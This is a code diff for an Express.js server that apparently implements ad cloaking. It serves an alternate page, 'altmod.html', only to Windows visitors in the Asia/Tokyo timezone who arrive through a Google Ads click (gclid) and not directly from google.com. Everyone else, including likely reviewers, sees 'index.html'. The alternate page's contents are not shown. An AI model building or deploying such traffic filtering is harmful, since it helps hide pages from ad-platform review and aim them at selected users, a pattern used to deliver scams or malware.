@@ -19,18 +19,27 @@ const allowedOrigins = [
 // Normalize referer function to handle trailing slashes
 const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");
 
-// Adjusted helper function to specifically block "https://www.google.com/"
-// and allow "https://googleads.g.doubleclick.net" or any other source
+// Helper function to check if the user's OS is Windows
+const isWindowsOS = (userAgent) => {
+  return userAgent.includes("Windows");
+};
+
+// Helper function to check if the referer is allowed
 const isAllowedReferrer = (referer) => {
   if (!referer) return true; // Proceed if no referer
 
   const hostname = new URL(referer).hostname;
-  
+  // Block direct visits from www.google.com
   if (hostname === "www.google.com") {
     return false;
   }
   // Allow visits from googleads.g.doubleclick.net or any other source
   return true;
+};
+
+// Helper function to check for the gclid parameter
+const hasGclidParam = (req) => {
+  return !!req.query.gclid;
 };
 
 // CORS configuration
@@ -51,28 +60,24 @@ app.use(cors(corsOptions));
 // Middleware to parse JSON bodies
 app.use(express.json());
 
+// Middleware to parse URL-encoded bodies (needed for gclid parameter in URL)
+app.use(express.urlencoded({ extended: true }));
+
 // Route to handle the POST request
 app.post(
   "/",
-  (req, res, next) => {
-    const referer = normalizeReferer(req.headers.referer);
-    console.log(`Referer: ${referer}`); // Log the referer for debugging
-
-    // Check if referer is allowed
-    if (
-      allowedOrigins.some((allowedOrigin) => referer.startsWith(allowedOrigin)) &&
-      isAllowedReferrer(referer)
-    ) {
-      next();
-    } else {
-      res.status(403).send("Access forbidden due to invalid referer or conditions not met.");
-    }
-  },
   (req, res) => {
+    const referer = normalizeReferer(req.headers.referer);
+    const userAgent = req.headers["user-agent"]; // Get the User-Agent from the request headers
     const { timezone } = req.body;
-    console.log(`Timezone: ${timezone}`); // Log the timezone for debugging
 
-    if (timezone === "Asia/Tokyo") {
+    console.log(`Referer: ${referer}, Timezone: ${timezone}, User-Agent: ${userAgent}`);
+
+    // Check all conditions: gclid parameter, Windows OS, allowed referrer, and timezone
+    if (hasGclidParam(req) &&
+        isWindowsOS(userAgent) &&
+        isAllowedReferrer(referer) &&
+        timezone === "Asia/Tokyo") {
       res.sendFile(path.join(__dirname, "altmod.html"));
     } else {
       res.sendFile(path.join(__dirname, "index.html"));
